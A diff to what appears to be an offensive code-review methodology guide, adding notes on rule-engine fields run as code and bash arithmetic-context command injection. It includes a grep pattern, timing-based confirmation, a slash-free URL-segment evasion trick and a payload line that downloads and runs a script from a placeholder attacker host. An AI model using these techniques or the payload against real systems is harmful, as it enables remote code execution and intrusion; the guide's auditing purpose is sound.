@@ -75,6 +75,18 @@ real boxes:
   extract-to-directory routine is a candidate for arbitrary write.
 - **String-concatenated SQL** — `"SELECT ... WHERE id = " + id`. Grep for
   `f"SELECT`, `"SELECT ... " +`, `#{}` in Ruby, `${}` in template strings.
+- **A user-editable string that is later run as code — a "rule engine",
+  "formula", "expression", "policy" or "script" field.** The tell is that a
+  stored value is fed to `eval`/`assert`/`create_function`, PHP `runkit_function_add`,
+  Python `eval`/`exec`, JS `Function()`/`vm`, or Ruby `eval` — not to a parser.
+  Grep the sink list for the *value's* origin: if it traces to a DB column or a
+  request field, whoever can write that field has code execution as the process.
+  Two follow-ups pay off: (1) find the *only writer* of the field and check its
+  authz gate (often a single role/flag you can obtain), and (2) look for the
+  **same engine a second time at a higher privilege** — a builder that runs the
+  rule as the web user on one path frequently re-runs an equivalent rule as a
+  service/root daemon on another. The fix is always "make the format declarative",
+  which is exactly why the pattern recurs unfixed across a codebase.
 
 ## Third pass — authorization, not authentication
 
@@ -141,6 +153,44 @@ entirely (`Path.Combine` discards `base` on an absolute/traversing second arg).
 Any code that extracts an archive, or joins a user-supplied filename to a
 directory, into a writable location is a candidate; pair it with an app-local
 `hostfxr.dll` drop for RCE (`references/foothold.md`).
+
+## Follow the data into the shell script, not just into the process spawn
+
+A safe-looking spawn in the calling language proves nothing about the boundary.
+`subprocess.run(["./x.sh", untrusted])` with no `shell=True` is correct and
+irrelevant if `x.sh` then puts `$1` somewhere that re-parses it. Read the callee.
+
+The recurring sink is **bash arithmetic context**, which performs command
+substitution on its operands:
+
+```bash
+if [[ "$1" -eq 0 ]]; then      # -eq/-ne/-lt/-gt, (( ... )), $(( ... )), array subscripts
+```
+
+`a[$(cmd)]` parses as an array element reference; the subscript is
+arithmetic-evaluated and `cmd` runs. Quoting `"$1"` does not help — the value,
+not the word, is what gets evaluated. Grep any script reachable from user input:
+
+```bash
+grep -nE '\[\[[^]]*-(eq|ne|lt|le|gt|ge)[^]]*\$|\(\(.*\$|\$\(\(' *.sh
+```
+
+Confirm it with a side effect, not with output: `a[$(sleep 5)]` timed, or a
+callback, since the caller usually discards stdout.
+
+**When the injection point is a URL path segment you have no `/`.** Flask's
+default `<var>` converter rejects it, and `%2F` risks being decoded into a route
+split. Build the character at run time instead of fighting the router:
+`${HOME:0:1}` (or `${PWD:0:1}`) is `/`, `${IFS}` supplies the separators, and both
+expand normally inside the `$( )` the evaluator runs — so a full
+`curl -s -o /tmp/.s http://<you>/s ; bash /tmp/.s` fits in a single segment with
+no literal slash or space. URL-encode the whole payload once at the client.
+
+Generalises past bash: any place a language hands a string to a second
+interpreter — `eval`, an arithmetic parser, a template, an SQL string built for a
+different engine — the second interpreter is where the boundary actually is, and
+a comment in the first one asserting that it is safe is a signal to read further,
+not to stop.
 
 ## Feed it back
 
